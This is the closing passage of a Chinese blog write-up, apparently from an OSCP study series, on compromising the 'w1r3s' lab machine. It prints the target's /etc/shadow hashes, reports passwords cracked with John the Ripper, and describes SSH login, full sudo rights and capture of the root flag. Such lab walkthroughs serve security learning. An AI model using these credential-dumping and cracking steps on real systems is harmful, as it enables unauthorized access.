+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>:$<span class="hljs-number">6</span>$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:<span class="hljs-number">17554</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">daemon</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">bin</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">sys</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">sync</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">games</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">man</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">lp</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">mail</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">news</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">uucp</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">proxy</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">www</span>-data:$<span class="hljs-number">6</span>$<span class="hljs-number">8</span>JMxE7l0$yQ16jM..ZsFxpoGue8/<span class="hljs-number">0</span>LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:<span class="hljs-number">17560</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">backup</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">list</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">irc</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">gnats</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">nobody</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">systemd</span>-timesync:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">systemd</span>-network:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">systemd</span>-resolve:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">systemd</span>-bus-proxy:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">syslog</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">_apt</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">messagebus</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">uuidd</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">lightdm</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">whoopsie</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">avahi</span>-autoipd:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">avahi</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">dnsmasq</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">colord</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">speech</span>-dispatcher:!:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">hplip</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">kernoops</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">pulse</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">rtkit</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">saned</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">usbmux</span>:*:<span class="hljs-number">17379</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">w1r3s</span>:$<span class="hljs-number">6</span>$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:<span class="hljs-number">17567</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">sshd</span>:*:<span class="hljs-number">17554</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">ftp</span>:*:<span class="hljs-number">17554</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><span class="hljs-attribute">mysql</span>:!:<span class="hljs-number">17554</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br></code></pre></td></tr></table></figure>
+
+<p>然后利用john进行破解，发现成功破解到密码</p>
+<p>www-data         (www-data)<br>computer         (w1r3s)</p>
+<p>于是我们利用ssh登陆上，然后再查看sudo的权限,发现此处w1r3s的权限都是ALL，可以说明，此台机器已经全部拿下。<br>并在&#x2F;root目录下找到了flag.txt文件</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/OSCP%E5%A4%87%E8%80%83/">#OSCP备考</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>w1r3s</div>
+      <div>http://example.com/2022/12/20/w1r3s/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>So1Lupus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年12月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/03/06/Road%20to%20OSCP-2%20Lame/" title="Road to OSCP-2 Lame">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Road to OSCP-2 Lame</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/09/28/nodejs/" title="nodejs">
+                        <span class="hidden-mobile">nodejs</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      浙ICP备2022029346号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
